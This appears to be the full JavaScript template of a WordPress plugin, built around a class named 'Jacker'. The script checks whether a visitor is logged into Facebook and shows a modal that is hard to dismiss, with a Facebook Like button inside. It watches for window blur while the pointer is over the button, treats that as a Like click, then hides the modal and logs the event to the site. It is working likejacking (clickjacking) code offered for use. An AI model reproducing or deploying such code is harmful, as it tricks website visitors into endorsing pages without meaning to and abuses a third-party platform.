<div id="fb-root"></div>
<script>
(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) return;
  js = d.createElement(s); js.id = id;
  js.src = "//connect.facebook.net/en_US/sdk.js#xfbml=1&version=v2.5&appId=<?php echo get_option('ljn_app_id'); ?>";
  fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));

(function($) {
    function Jacker() {
        this.url = '';
        this.modalWindowContent = '';
        this.jackDevices;
        this.inArea = false;
        this.modal;
        this.customEvent;
        this.deviceType;
        this.loggedIn;

        this.getSettings = function() {
            var _this = this;

            $.ajax({
                url : '<?php echo admin_url('admin-ajax.php'); ?>',
                type : 'GET',
                async : false,
                dataType : 'json',
                data : {
                    action : 'get_settings'
                }
            }).done(function(response) {
                _this.url = _this.parseEscapedHtml(response.url);
                _this.modalWindowContent = _this.parseEscapedHtml(response.modal_window_content);
                _this.jackDevices = response.jack_devices;

                window.fbAsyncInit = function() {
                    _this.setUserLoggedIn(FB);
                };
            });
        }

        this.setUserLoggedIn = function(FB) {
            var _this = this;
            FB.getLoginStatus(function(response) {
                _this.loggedIn = (response.status === 'connected' || response.status === 'not_authorized');
            });
        }

        this.isUserLoggedIn = function() {
            return this.loggedIn;
        }

        this.inspectClientDevice = function() {
            var userAgent = navigator.userAgent || navigator.vendor || window.opera;
            if (userAgent.match(/Android/i)) {
                this.customEvent = 'touchleave';
                this.deviceType = 'mobile';
            } else if (userAgent.match(/iPad|iPhone|iPod/i)) {
                this.customEvent = 'touchstart';
                this.deviceType = 'mobile';
            } else {
                this.deviceType = 'desktop';
            }
        }

        this.parseEscapedHtml = function(escaped) {
            return $('<div />').html(escaped).text();
        }

        this.deviceAllowed = function() {
            return this.jackDevices.indexOf(this.deviceType) != -1;
        }

        this.appendModalToDom = function() {
            this.modal = $('<div class="js-reveal-modal reveal-modal"/>');
            var closeButton = $('<div class="js-modal-like-container modal-like-container"><div class="js-close-reveal close-reveal"></div><div id="ljn-main-button" class="fb-like" data-href="'+this.url+'" data-layout="standard" data-show-faces="false" data-action="like" data-share="false"></div></div>'),
                para = $('<p>' + this.modalWindowContent + '</p>');

            this.modal.append(para, closeButton);

            $('body').prepend(this.modal);
        }

        this.appendReveal = function() {
            this.modal.reveal({
                closeonbackgroundclick : false,
                dismissmodalclass : 'js-close-reveal'
            });
        }

        this.jack = function() {
            this.registerEvents();
            this.appendReveal();
        }

        this.registerEvents = function() {
            var _this = this;
            $('.js-modal-like-container').on({
                mouseenter: function() {
                    _this.inArea = true;
                },
                mouseleave: function() {
                    _this.inArea = false;
                }
            });

            $(document).on(this.customEvent, '.js-close-reveal', function() {
                var reveal_modal = $('.js-reveal-modal');
                    reveal_modal.addClass('modal-inactive-important');
                    reveal_modal.children().css('display', 'none');
                    setTimeout(function() {
                        reveal_modal.css({'display': 'none'});
                    }, 600);
            });

            window.focus();

            $(window).on('blur', function() {
                if(_this.inArea != true) return;

                setTimeout(function() {
                    $('.js-close-reveal').click();
                    var reveal_modal = $('.js-reveal-modal');
                    reveal_modal.addClass('modal-inactive-important');
                    reveal_modal.children().css('display', 'none');
                    setTimeout(function() {
                        reveal_modal.css({'display': 'none'});
                    }, 600);

                    $.ajax({
                        url : '<?php echo admin_url('admin-ajax.php'); ?>',
                        type : 'POST',
                        async : true,
                        data : {
                            action : 'log',
                            ljn_url : _this.url
                        }
                    });
                }, 500);
            });
        }

    }

    $(document).ready(function() {
        var jacker = new Jacker();
        jacker.getSettings();
        jacker.appendModalToDom();
        var timer = setInterval(function() {
            if(typeof jacker.isUserLoggedIn() != 'undefined') {
                jacker.inspectClientDevice();
                if(jacker.isUserLoggedIn() && jacker.deviceAllowed()) {
                    jacker.jack();
                }
                clearInterval(timer);
            }
        }, 100);
    });
})(jQuery);
</script>